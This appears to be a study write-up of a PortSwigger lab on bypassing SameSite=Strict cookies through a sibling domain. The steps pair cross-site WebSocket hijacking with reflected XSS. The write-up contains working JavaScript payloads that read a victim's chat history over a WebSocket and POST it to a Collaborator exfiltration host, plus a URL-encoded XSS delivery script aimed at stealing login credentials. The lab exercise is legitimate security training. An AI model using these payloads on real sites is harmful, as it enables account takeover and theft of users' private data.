- Whether you're testing someone else's website or trying to secure your own, it's essential to keep in mind that a request can still be same-site even if it's issued cross-origin. Make sure you thoroughly audit all of the available attack surface, including any sibling domains.
- In particular, vulnerabilities that enable you to elicit an arbitrary secondary request, such as [XSS](https://portswigger.net/web-security/cross-site-scripting), can compromise site-based defenses completely, exposing all of the site's domains to cross-site attacks.
- In addition to classic CSRF, don't forget that if the target website supports [WebSockets](https://portswigger.net/web-security/websockets), this functionality might be vulnerable to [cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) (CSWSH), which is essentially just a [CSRF attack](https://portswigger.net/web-security/csrf) targeting a WebSocket handshake.

## Steps to solve lab
### Title - SameSite Strict bypass via sibling domain

**Desc** - This lab's live chat feature is vulnerable to [cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) ([CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)). To solve the lab, log in to the victim's account. To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text. If you haven't done so already, we recommend completing our topic on [WebSocket vulnerabilities](https://portswigger.net/web-security/websockets) before attempting this lab.



1. Browse to the application function that uses WebSockets and also look for entries appearing in the WebSockets history tab within Burp Proxy.
![[WebSockets2.png]]

2. In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
![[authentication27.png]]

3. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no [CSRF](https://portswigger.net/web-security/csrf) tokens.
![[WebSockets16.png]]

4. Right-click on the handshake request and select "Copy URL".

5. In the browser, go to the exploit server and paste the following template into the "Body" section:
```js
<script>
    // Creation of new WebSocket(that WebSocket that is used by lab)
    var ws = new WebSocket('wss://your-websocket-url');

    // Sending the "READY" command as soon as WebSocket connection is open(onopen is a event). After sending the "READY" command the WebSocket will reply with the entire chat history
    ws.onopen = function() {
        ws.send("READY");
    };
  
    // Once we receive messages from the WebSocket then we do a GET request with those messages to our collaborator server
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

6. Replace `your-websocket-url` with the URL from the WebSocket handshake (`YOUR-LAB-ID.web-security-academy.net/chat`). Make sure you change the protocol from `https://` to `wss://`. Replace `your-collaborator-url` with a payload generated by [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator).
7. Click "Deliver exploit to victim".

8. Poll for interactions in the Collaborator tab. Verify that the attack has successfully retrieved carlos chat history but here we got nothing as shown below:
![[csrf61.png]]
We got nothing as you can see above because there is a security feature applied which is "Same Site=Strict". So, we can't do request this but from the labs description we already know that there might be a vulnerable domain.

9. After looking around http request in burp proxy in "HTTP history" tab, we got "Access-Control-Allow-Origin" header which shows something as follows:
![[csrf62.png]]
From this, we get to know that there is another domain(sibling domain) hosted in the same main domain.

![[csrf63.png]]
After analyzing, I found out that "Username" field is vulnerable to "Reflected XSS".

![[csrf64.png]]
We can take advantage of this vulnerable domain to exploit protected sibling domain.

![[csrf65.png]]

Now, change the Request from POST to GET and see if this domain accepts your request.
![[csrf66.png]]
As you can see above, it accepts request. Now, you can send your payload link as a value of the "Username" to victim and from that the "Samesite=Strict" bypass is possible because of "Access-Control-Allow-Origin" header.

10. Url encode the below payload.
**Payload** - 
```js

<script>

    // Creation of new WebSocket(that WebSocket that is used by lab)
    var ws = new WebSocket('wss://your-websocket-url');

    // Sending the "READY" command as soon as WebSocket connection is open(onopen is a event). After sending the "READY" command the WebSocket will reply with the entire chat history
    ws.onopen = function() {
        ws.send("READY")
    };

    // Once we receive messages from the WebSocket then we do a GET request with those messages to our collaborator server
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data})
    };
</script>
```

![[csrf67.png]]

Paste the Url encoded payload as the value of "Username" and also copy paste the below payload in Exploit-server.
```js
<script>
document.location = "https://cms-0a400099041b59df8075950100360059.web-security-academy.net/login?username=%0a%3c%73%63%72%69%70%74%3e%0a%0a%20%20%20%20%2f%2f%20%43%72%65%61%74%69%6f%6e%20%6f%66%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%74%68%61%74%20%57%65%62%53%6f%63%6b%65%74%20%74%68%61%74%20%69%73%20%75%73%65%64%20%62%79%20%6c%61%62%29%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%34%30%30%30%39%39%30%34%31%62%35%39%64%66%38%30%37%35%39%35%30%31%30%30%33%36%30%30%35%39%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%0a%20%20%20%20%2f%2f%20%53%65%6e%64%69%6e%67%20%74%68%65%20%22%52%45%41%44%59%22%20%63%6f%6d%6d%61%6e%64%20%61%73%20%73%6f%6f%6e%20%61%73%20%57%65%62%53%6f%63%6b%65%74%20%63%6f%6e%6e%65%63%74%69%6f%6e%20%69%73%20%6f%70%65%6e%28%6f%6e%6f%70%65%6e%20%69%73%20%61%20%65%76%65%6e%74%29%2e%20%41%66%74%65%72%20%73%65%6e%64%69%6e%67%20%74%68%65%20%22%52%45%41%44%59%22%20%63%6f%6d%6d%61%6e%64%20%74%68%65%20%57%65%62%53%6f%63%6b%65%74%20%77%69%6c%6c%20%72%65%70%6c%79%20%77%69%74%68%20%74%68%65%20%65%6e%74%69%72%65%20%63%68%61%74%20%68%69%73%74%6f%72%79%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%0a%20%20%20%20%7d%3b%0a%0a%20%20%20%20%2f%2f%20%4f%6e%63%65%20%77%65%20%72%65%63%65%69%76%65%20%6d%65%73%73%61%67%65%73%20%66%72%6f%6d%20%74%68%65%20%57%65%62%53%6f%63%6b%65%74%20%74%68%65%6e%20%77%65%20%64%6f%20%61%20%47%45%54%20%72%65%71%75%65%73%74%20%77%69%74%68%20%74%68%6f%73%65%20%6d%65%73%73%61%67%65%73%20%74%6f%20%6f%75%72%20%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%20%73%65%72%76%65%72%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%71%36%78%76%38%76%35%78%6e%65%6f%7a%6c%66%6d%6d%6a%67%67%6e%30%68%31%39%75%30%30%72%6f%6d%63%62%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=%3C%2Fscript%3Ealert%28%27hi%27%29%3C%2Fscript%3E"
</script>
```

![[csrf68.png]]

![[csrf69.png]]

12. Now, login with carlos credentials.
